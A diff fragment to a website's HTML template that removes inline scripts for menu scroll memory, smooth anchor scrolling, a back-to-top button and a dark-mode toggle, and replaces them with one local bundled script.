-            menu.scrollLeft = parseInt(scrollPosition, 10);
-        }
-        
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
 
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
 
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
 
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        const html = document.querySelector("html");
-        if (html.dataset.theme === "dark") {
-            html.dataset.theme = 'light';
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            html.dataset.theme = 'dark';
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
 
-</script>
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
 </body>
-
 </html>
